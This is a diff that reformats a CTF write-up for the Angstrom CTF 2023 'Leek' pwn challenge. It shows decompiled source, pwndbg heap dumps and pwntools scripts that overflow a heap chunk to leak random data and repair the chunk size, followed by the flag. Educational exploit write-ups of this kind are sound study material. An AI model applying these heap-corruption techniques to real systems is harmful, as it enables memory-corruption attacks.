@@ -1,7 +1,31 @@
-# Angstrom CTF 2023: Leek (pwn)
+---
+name: Leek (2023)
+event: Angstrom CTF 2023
+category: Pwn
+description: Writeup for Leek (Pwn) - Angstrom CTF (2023) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
+
+# Leek
+
+## Video Walkthrough
+
 [![VIDEO](https://img.youtube.com/vi/55jibxjUj3I/0.jpg)](https://youtu.be/55jibxjUj3I "Angstrom CTF 2023: Leek (pwn)")
 
-Source code (manually renamed):
+## Reversing
+
+#### source.c (manually renamed)
+
 ```c
 void input(void *user_input)
 {
@@ -9,7 +33,7 @@ void input(void *user_input)
   long in_FS_OFFSET;
   char buffer [1288];
   long canary;
-  
+
   canary = *(long *)(in_FS_OFFSET + 0x28);
   fgets(buffer,1280,stdin);
   buffer_len = strlen(buffer);
@@ -33,7 +57,7 @@ void main(void)
   int i;
   char buffer [40];
   long canary;
-  
+
   canary = *(long *)(in_FS_OFFSET + 0x28);
   tVar2 = time((time_t *)0x0);
   srand((uint)tVar2);
@@ -84,22 +108,22 @@ void main(void)
 }
 ```
 
-- A chunk of 32 random bytes is created and we need to supply the matching bytes.
-- Do that 100 times, and we get the flag.
-- If we send 31 bytes, the output is leaked!
+-   A chunk of 32 random bytes is created and we need to supply the matching bytes.
+-   Do that 100 times, and we get the flag.
+-   If we send 31 bytes, the output is leaked!
 
 ```bash
-./leek 
+./leek
 I dare you to leek my secret.
 Your input (NO STACK BUFFER OVERFLOWS!!): aaaabaaacaaadaaaeaaafaaagaaahaaa
 :skull::skull::skull: bro really said: aaaabaaacaaadaaaeaaafaaagaaahaaa
 ��`W;57r';I=׎�͇�t�. Ux+�<�
 ```
 
-exploit.py
+#### exploit.py
+
 ```python
 from pwn import *
-
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -109,7 +133,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -140,7 +163,6 @@ secret = io.recvline().strip()
 
 io.sendafter(b'What\'s my secret?', secret)
 
-# TODO
 io.sendlineafter(b'Say what you want:', b'B' * 24)
 
 # Got Shell?
@@ -150,6 +172,7 @@ io.interactive()
 The secret comparison works but we get a corrupt pointer error when the `random_chunk` is freed.
 
 Set a breakpoint at the free (`break *0x4016b5`):
+
 ```python
 pwndbg> heap
 Allocated chunk | PREV_INUSE
@@ -178,6 +201,7 @@ x/33x 0x704290
 ```
 
 Remember chunk layout:
+
 ```python
     chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             |             Size of previous chunk, if unallocated (P clear)  |
@@ -196,6 +220,7 @@ nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
 
 Setup a breakpoint after both chunks were created (`break *0x4015e2`) and check the heap:
+
 ```python
 heap
 
@@ -217,6 +242,7 @@ Size: 0x20d21
 ```
 
 And a snippet of the chunks:
+
 ```python
 vis
 
@@ -231,6 +257,7 @@ vis
 ```
 
 So, we should be setting the size of the chunk `0x234d2b0` to `0x31`
+
 ```python
 x/32gx 0x234d280
 0x234d280:	0x0000000000000000	0x0000000000000000
@@ -253,15 +280,16 @@ x/32gx 0x234d280
 
 To do that, we supply `0x00 * 24` into the `userinput_chunk` which fills up `0x234d2a0` until we reach the size of the next chunk, where we write `0x31` while being careful to ensure correct padding, e.g. `0x31 + (0x00 * 6)`.
 
-### Solution
+## Solution
+
 TLDR; when we supply 31 bytes into our 16 byte `userinput_chunk`, we merge the chunks so that when our chunk is printed back to us, we also get the random data.
 
 After supplying the secret, we need to repair the heap layout (fix the size of the random data chunk), ready for the next loop.
 
-solve.py
+#### solve.py
+
 ```python
 from pwn import *
-
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -271,7 +299,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -315,4 +342,4 @@ for i in range(100):
 io.interactive()
 ```
 
-`actf{very_133k_of_y0u_777522a2c32b7dd6}`
+Flag: `actf{very_133k_of_y0u_777522a2c32b7dd6}`
